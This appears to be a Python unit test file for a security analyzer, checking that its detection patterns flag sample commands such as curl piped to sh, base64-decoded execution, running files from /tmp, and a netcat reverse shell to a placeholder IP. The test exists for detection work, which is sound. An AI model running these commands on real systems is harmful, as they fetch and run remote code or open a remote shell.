import json
import tempfile
import unittest

from analyzers.security_analyzer import SecurityAnalyzer, DEFAULT_PATTERNS


class TestSecurityAnalyzerPatterns(unittest.TestCase):
    def setUp(self):
        self.analyzer = SecurityAnalyzer()

    def _assert_match(self, pattern_name, command):
        regex = self.analyzer.patterns[pattern_name]["regex"]
        self.assertRegex(command, regex)

    def test_shell_injection(self):
        self._assert_match("shell_injection", "curl -fsSL https://example.com/install.sh | sh")

    def test_stealth_download(self):
        self._assert_match("stealth_download", "wget https://example.com/a.sh && chmod +x a.sh")

    def test_obfuscation(self):
        self._assert_match("obfuscation", "echo Zm9v | base64 -d | sh")

    def test_tmp_execution(self):
        self._assert_match("tmp_execution", "/tmp/runme && chmod +x /tmp/runme && /tmp/runme")

    def test_remote_exec(self):
        self._assert_match("remote_exec", "bash <(curl -fsSL https://example.com/install.sh)")

    def test_suspicious_download(self):
        self._assert_match("suspicious_download", "curl -s https://example.com/payload")

    def test_hidden_file(self):
        self._assert_match("hidden_file", "echo foo >> .hidden")

    def test_network_access(self):
        self._assert_match("network_access", "nc -e /bin/sh 1.2.3.4 4444")

    def test_patterns_file_override(self):
        custom_patterns = {
            "custom": {
                "regex": "\\bhello\\b",
                "description": "Custom pattern",
                "severity": "low"
            }
        }
        with tempfile.NamedTemporaryFile("w", delete=False) as handle:
            json.dump(custom_patterns, handle)
            path = handle.name
        analyzer = SecurityAnalyzer(patterns_file=path)
        self.assertIn("custom", analyzer.patterns)
        self.assertNotEqual(analyzer.patterns, DEFAULT_PATTERNS)


if __name__ == "__main__":
    unittest.main()
